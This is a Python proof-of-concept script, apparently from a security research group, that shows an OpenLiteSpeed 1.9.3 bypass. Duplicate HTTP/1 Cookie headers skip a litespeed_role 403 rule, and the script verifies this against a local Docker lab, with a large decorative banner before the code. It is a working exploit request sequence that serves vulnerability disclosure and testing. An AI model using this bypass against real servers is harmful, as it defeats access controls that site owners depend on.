#!/usr/bin/env python3
######################################################################################
#
#        d8888 888888b.   8888888b.         d8888 Y88b   d88P        d8888  .d8888b.
#       d88888 888  "88b  888   Y88b       d88888  Y88b d88P        d88888 d88P  Y88b
#      d88P888 888  .88P  888    888      d88P888   Y88o88P        d88P888 Y88b.
#     d88P 888 8888888K.  888   d88P     d88P 888    Y888P        d88P 888  "Y888b.
#    d88P  888 888  "Y88b 8888888P"     d88P  888    d888b       d88P  888     "Y88b.
#   d88P   888 888    888 888 T88b     d88P   888   d88888b     d88P   888       "888
#  d8888888888 888   d88P 888  T88b   d8888888888  d88P Y88b   d8888888888 Y88b  d88P
# d88P     888 8888888P"  888   T88b d88P     888 d88P   Y88b d88P     888  "Y8888P"
#
#                     888             d8888 888888b.    .d8888b.
#                     888            d88888 888  "88b  d88P  Y88b
#                     888           d88P888 888  .88P  Y88b.
#                     888          d88P 888 8888888K.   "Y888b.
#                     888         d88P  888 888  "Y88b     "Y88b.
#                     888        d88P   888 888    888       "888
#                     888       d8888888888 888   d88P Y88b  d88P
#                     88888888 d88P     888 8888888P"   "Y8888P"
#
#  Website : https://abraxaslabs.tech
#  GitHub  : https://github.com/abraxas
#  Twitter : @abraxas_null
#  Mail    : abraxas.null@proton.me
#
#  CVE: openlitespeed-dup-cookie-litespeed-role (High: 7.5)
#  Vendor: OpenLiteSpeed (LiteSpeed Technologies)
#  Versions: OpenLiteSpeed 1.9.3 (leftover of 1.8.2.1 Cookie block)
#  Impact: HTTP/1 duplicate Cookie skips litespeed_role 403; lsphp still gets HTTP_COOKIE
#  Requires: HTTP/1.1; lsphp; loopback 127.0.0.1:18750
#
######################################################################################
#
#  RESEARCH / EDUCATIONAL USE ONLY.
#  Do not run, deploy, or use this material against any host unless you have
#  explicit written permission from both the party hosting this repository
#  and the owner of the target systems.
#
######################################################################################

import os as _os
import shutil as _shutil
import sys as _sys
import builtins as _builtins

_ART = {"abraxas": ["        d8888 888888b.   8888888b.         d8888 Y88b   d88P        d8888  .d8888b.", "       d88888 888  \"88b  888   Y88b       d88888  Y88b d88P        d88888 d88P  Y88b", "      d88P888 888  .88P  888    888      d88P888   Y88o88P        d88P888 Y88b.", "     d88P 888 8888888K.  888   d88P     d88P 888    Y888P        d88P 888  \"Y888b.", "    d88P  888 888  \"Y88b 8888888P\"     d88P  888    d888b       d88P  888     \"Y88b.", "   d88P   888 888    888 888 T88b     d88P   888   d88888b     d88P   888       \"888", "  d8888888888 888   d88P 888  T88b   d8888888888  d88P Y88b   d8888888888 Y88b  d88P", " d88P     888 8888888P\"  888   T88b d88P     888 d88P   Y88b d88P     888  \"Y8888P\""], "labs": ["                     888             d8888 888888b.    .d8888b.", "                     888            d88888 888  \"88b  d88P  Y88b", "                     888           d88P888 888  .88P  Y88b.", "                     888          d88P 888 8888888K.   \"Y888b.", "                     888         d88P  888 888  \"Y88b     \"Y88b.", "                     888        d88P   888 888    888       \"888", "                     888       d8888888888 888   d88P Y88b  d88P", "                     88888888 d88P     888 8888888P\"   \"Y8888P\""]}
_CVE = "openlitespeed-dup-cookie-litespeed-role"
_SITE = "https://abraxaslabs.tech"
_GH = "https://github.com/abraxas"
_XURL = "https://x.com/abraxas_null"
_XH = "@abraxas_null"
_EMAIL = "abraxas.null@proton.me"
_RST = "\033[0m"
_BLD = "\033[1m"


def _on():
    return not _os.environ.get("NO_COLOR")


def _rgb(r, g, b):
    return f"\033[38;2;{r};{g};{b}m" if _on() else ""


_RAIN = [
    (255, 77, 224), (255, 0, 212), (191, 95, 255), (91, 140, 255),
    (0, 210, 255), (0, 255, 249), (57, 255, 20), (180, 255, 70),
    (255, 230, 0), (255, 201, 70), (255, 122, 24), (255, 64, 96),
]


def _lerp(a, b, t):
    return tuple(int(a[i] + (b[i] - a[i]) * t) for i in range(3))


def _rain(x, width):
    if width <= 1:
        return _RAIN[0]
    t = (x / (width - 1)) * (len(_RAIN) - 1)
    i = min(int(t), len(_RAIN) - 2)
    return _lerp(_RAIN[i], _RAIN[i + 1], t - i)


def _logo_line(line, y, n):
    width = max(len(line), 1)
    out = []
    q = False
    for x, ch in enumerate(line):
        if ch == " ":
            out.append(ch)
            continue
        if ch == '"':
            q = not q
            out.append(_rgb(*(255, 201, 70) if q else (255, 230, 0)) + ch)
            continue
        if q:
            out.append(_rgb(255, 230, 0) + ch)
            continue
        r, g, b = _rain(x, width)
        out.append(_rgb(r, g, b) + ch)
    return "".join(out) + _RST


def print_abraxas_banner():
    cols = _shutil.get_terminal_size((120, 30)).columns
    art = _ART["abraxas"] + _ART["labs"]
    art_w = max(len(x) for x in art)
    content_w = min(max(art_w, 88), max(cols - 4, 40))
    box_w = content_w + 4
    if box_w > cols:
        content_w = max(cols - 4, 20)
        box_w = content_w + 4
    cyan, mag = _rgb(0, 255, 249), _rgb(255, 0, 212)
    top = cyan + "╔" + "═" * (box_w - 2) + "╗" + _RST
    mid = mag + "╠" + "═" * (box_w - 2) + "╣" + _RST
    bot = cyan + "╚" + "═" * (box_w - 2) + "╝" + _RST

    def row(vis, rendered, border):
        return _rgb(*border) + "║" + _RST + " " + rendered + _RST + " " + _rgb(*border) + "║" + _RST

    lines = [top]
    title_l, title_r = " ABRAXAS LABS", "analyze · reverse · disclose"
    gap = max(content_w - len(title_l) - len(title_r), 1)
    title = (title_l + " " * gap + title_r)[:content_w].ljust(content_w)
    cells = []
    split, rstart = len(title_l), content_w - len(title_r)
    for i, ch in enumerate(title):
        if ch == " ":
            cells.append(ch)
        elif i < split:
            cells.append(_rgb(0, 255, 249) + _BLD + ch)
        elif i >= rstart:
            cells.append(_rgb(140, 155, 175) + ch)
        else:
            cells.append(ch)
    lines.append(row(title, "".join(cells) + _RST, (0, 255, 249)))
    lines.append(mid)
    cve_l = " " + _CVE
    cve_r = "authorized research only"
    rest = max(content_w - len(cve_l) - len(cve_r), 3)
    midtxt = " local lab ".center(rest)[:rest]
    cve_line = (cve_l + midtxt + cve_r)[:content_w].ljust(content_w)
    cells = []
    le, rs = len(cve_l), content_w - len(cve_r)
    for i, ch in enumerate(cve_line):
        if ch == " ":
            cells.append(ch)
        elif i < le:
            cells.append(_rgb(255, 77, 224) + _BLD + ch)
        elif i >= rs:
            cells.append(_rgb(57, 255, 20) + ch)
        else:
            cells.append(_rgb(255, 0, 212) + ch)
    lines.append(row(cve_line, "".join(cells) + _RST, (255, 0, 212)))
    lines.append(mid)
    n = len(_ART["abraxas"])
    for y, line in enumerate(_ART["abraxas"]):
        vis = line[:content_w].ljust(content_w)
        lines.append(row(vis, _logo_line(vis, y, n), (255, 0, 212)))
    for y, line in enumerate(_ART["labs"]):
        vis = line[:content_w].ljust(content_w)
        lines.append(row(vis, _logo_line(vis, y, n), (255, 0, 212)))
    lines.append(mid)
    for left, right in (("Website", _SITE), ("GitHub", _GH), ("X", _XH + "  " + _XURL), ("Mail", _EMAIL)):
        gap = max(content_w - 1 - len(left) - len(right), 1)
        vis = (" " + left + " " * gap + right)[:content_w].ljust(content_w)
        out = []
        left_end = 1 + len(left)
        right_start = content_w - len(right)
        for i, ch in enumerate(vis):
            if ch == " ":
                out.append(ch)
            elif i < left_end:
                out.append(_rgb(255, 230, 0) + ch)
            elif i >= right_start:
                out.append(_rgb(0, 255, 249) + ch)
            else:
                out.append(ch)
        lines.append(row(vis, "".join(out) + _RST, (255, 0, 212)))
    lines.append(bot)
    status = "[*]  abraxas!null ready on #labs   ·   " + _SITE
    scol = []
    for ch in status:
        if ch == " ":
            scol.append(ch)
        elif ch in "[]*":
            scol.append(_rgb(57, 255, 20) + ch)
        elif ch in "·#":
            scol.append(_rgb(255, 77, 224) + ch)
        else:
            scol.append(_rgb(232, 255, 248) + ch)
    lines.append(" " + "".join(scol) + _RST)
    _sys.stdout.write("\n".join(lines) + "\n\n")
    _sys.stdout.flush()


def _cprint(*args, **kwargs):
    sep = kwargs.get("sep", " ")
    s = sep.join(str(a) for a in args)
    low = s.lower()
    if s.startswith("SUCCESS") or "success" == low[:7]:
        col = _rgb(57, 255, 20) + _BLD
    elif s.startswith("FAIL") or low.startswith("fail"):
        col = _rgb(255, 64, 96) + _BLD
    elif "user_id" in low:
        col = _rgb(255, 201, 70) + _BLD
    elif low.startswith("status=") or "status=" in low[:20]:
        col = _rgb(0, 255, 249)
    elif low.startswith("carrier"):
        col = _rgb(255, 0, 212)
    elif s.lstrip().startswith("{") or s.lstrip().startswith("["):
        col = _rgb(255, 230, 0)
    else:
        col = _rgb(232, 255, 248)
    kwargs = dict(kwargs)
    file = kwargs.get("file", _sys.stdout)
    if file is _sys.stdout or file is _sys.stderr:
        _builtins.print(col + s + _RST, **{k: v for k, v in kwargs.items() if k != "sep"})
    else:
        _builtins.print(*args, **kwargs)


print_abraxas_banner()
_builtins.print = _cprint

"""Prove OLS 1.9.3 HTTP/1 duplicate Cookie skips litespeed_role= 403."""


import os
import socket
import subprocess
from dataclasses import dataclass
from pathlib import Path

LABEL = "openlitespeed-dup-cookie-litespeed-role"
WITNESS = "OLS-DUP-COOKIE-LITESPEED-ROLE-WITNESS"
COMPOSE_PROJECT = os.environ.get("COMPOSE_PROJECT_NAME", LABEL)
HERE = Path(__file__).resolve().parent
HOST = "127.0.0.1"
PORT = 18750
PATH = "/cookie.php"
TIMEOUT_S = 20.0
RECV_LIMIT = 1_048_576
PINNED_VERSION = "1.9.3"


@dataclass(frozen=True)
class HttpExchange:
    status: int
    reason: str
    body: str
    raw: bytes


def log(msg: str) -> None:
    print(msg, flush=True)


def fail(reason: str) -> int:
    log(f"FAIL {LABEL} {reason} {WITNESS}")
    return 1


def compose(*args: str, timeout: int = 60) -> subprocess.CompletedProcess[str]:
    return subprocess.run(
        ["docker", "compose", "-p", COMPOSE_PROJECT, *args],
        cwd=HERE,
        text=True,
        capture_output=True,
        timeout=timeout,
        check=False,
    )


def clip(text: str, limit: int = 240) -> str:
    compact = text.replace("\r\n", "\\n").replace("\n", "\\n")
    if len(compact) > limit:
        return compact[:limit] + "..."
    return compact


def raw_get(cookie_headers: list[str]) -> HttpExchange:
    lines = [
        f"GET {PATH} HTTP/1.1",
        f"Host: {HOST}:{PORT}",
        "Connection: close",
        *cookie_headers,
        "",
        "",
    ]
    request = "\r\n".join(lines).encode("ascii")
    with socket.create_connection((HOST, PORT), TIMEOUT_S) as sock:
        sock.settimeout(TIMEOUT_S)
        sock.sendall(request)
        chunks = bytearray()
        while len(chunks) < RECV_LIMIT:
            try:
                piece = sock.recv(65536)
            except (TimeoutError, socket.timeout):
                break
            if not piece:
                break
            chunks.extend(piece)
    raw = bytes(chunks)
    if not raw:
        raise ConnectionError("empty-http-response")
    header_blob, sep, body_blob = raw.partition(b"\r\n\r\n")
    if not sep:
        header_blob, sep, body_blob = raw.partition(b"\n\n")
    status_line = header_blob.split(b"\r\n", 1)[0].split(b"\n", 1)[0]
    parts = status_line.decode("latin-1", errors="replace").split(" ", 2)
    if len(parts) < 2 or not parts[1].isdigit():
        raise ValueError(f"bad-status-line={status_line!r}")
    status = int(parts[1])
    reason = parts[2] if len(parts) > 2 else ""
    body = body_blob.decode("utf-8", errors="replace")
    return HttpExchange(status=status, reason=reason, body=body, raw=raw)


def summarize(name: str, exchange: HttpExchange) -> None:
    log(
        f"{name} status={exchange.status} reason={exchange.reason!r} "
        f"body={clip(exchange.body)!r}"
    )


def oracle_ran(body: str) -> bool:
    return any(line.startswith("HTTP_COOKIE=") for line in body.splitlines())


def witness_line(body: str) -> bool:
    return WITNESS in body.splitlines()


def http_cookie_value(body: str) -> str:
    for line in body.splitlines():
        if line.startswith("HTTP_COOKIE="):
            return line[len("HTTP_COOKIE=") :]
    return ""


def cookie_role_value(body: str) -> str:
    for line in body.splitlines():
        if line.startswith("litespeed_role="):
            return line[len("litespeed_role=") :]
    return ""


def php_how(body: str) -> str:
    tokens: list[str] = []
    if WITNESS in http_cookie_value(body):
        tokens.append("php-http-cookie")
    if WITNESS in cookie_role_value(body):
        tokens.append("php-cookie")
    if not tokens and witness_line(body):
        tokens.append("php-body")
    return ",".join(tokens)


def read_ols_version() -> str:
    candidates = (
        ("cat", "/usr/local/lsws/VERSION"),
        ("cat", "/usr/local/lsws/lshttpd/VERSION"),
        ("/usr/local/lsws/bin/lshttpd", "-v"),
    )
    for argv in candidates:
        proc = compose("exec", "-T", "ols", *argv, timeout=30)
        text = ((proc.stdout or "") + (proc.stderr or "")).strip()
        if proc.returncode == 0 and text:
            first = text.splitlines()[0].strip()
            log(f"ols-version-cmd={' '.join(argv)} value={first!r}")
            return first
        err = clip((proc.stderr or proc.stdout or "").strip(), 160)
        log(f"ols-version-miss cmd={' '.join(argv)} rc={proc.returncode} err={err!r}")
    return ""


def main() -> int:
    log(f"label={LABEL} target={HOST}:{PORT}{PATH}")
    version = read_ols_version()
    if not version.startswith(PINNED_VERSION):
        return fail(f"ols-version-not-{PINNED_VERSION} got={version!r}")

    log("== block single Cookie litespeed_role ==")
    try:
        blocked = raw_get([f"Cookie: litespeed_role={WITNESS}"])
    except (OSError, ValueError) as exc:
        return fail(f"block-request-failed {exc}")
    summarize("block", blocked)
    if blocked.status != 403:
        return fail(f"single-cookie={blocked.status}")
    if oracle_ran(blocked.body) and witness_line(blocked.body):
        return fail("single-cookie-403-php-printed-witness")

    log("== ok-dummy Cookie dummy=1 ==")
    try:
        dummy = raw_get(["Cookie: dummy=1"])
    except (OSError, ValueError) as exc:
        return fail(f"dummy-request-failed {exc}")
    summarize("dummy", dummy)
    if dummy.status != 200:
        return fail(f"dummy={dummy.status}")
    if not oracle_ran(dummy.body):
        return fail("dummy-php-did-not-run")
    if witness_line(dummy.body) or WITNESS in dummy.body:
        return fail("dummy-body-has-witness")

    log("== bypass duplicate Cookie ==")
    try:
        bypass = raw_get(
            [
                "Cookie: dummy=1",
                f"Cookie: litespeed_role={WITNESS}",
            ]
        )
    except (OSError, ValueError) as exc:
        return fail(f"bypass-request-failed {exc}")
    summarize("bypass", bypass)
    if bypass.status != 200:
        return fail(f"dup-cookie={bypass.status}")
    if not oracle_ran(bypass.body):
        return fail("dup-cookie-php-did-not-run")
    if not witness_line(bypass.body):
        return fail("dup-cookie-php-missed-witness")

    http_cookie = http_cookie_value(bypass.body)
    role = cookie_role_value(bypass.body)
    how = php_how(bypass.body)
    log(f"bypass-http-cookie={http_cookie!r}")
    log(f"bypass-php-cookie-role={role!r}")
    log(f"bypass-how={how}")
    if WITNESS not in http_cookie and WITNESS not in role:
        return fail("php-sees-role=no")

    log(
        f"SUCCESS {LABEL} single-cookie=403 dummy=200 dup-cookie=200 "
        f"php-sees-role=yes how={how} {WITNESS}"
    )
    return 0


if __name__ == "__main__":
    raise SystemExit(main())

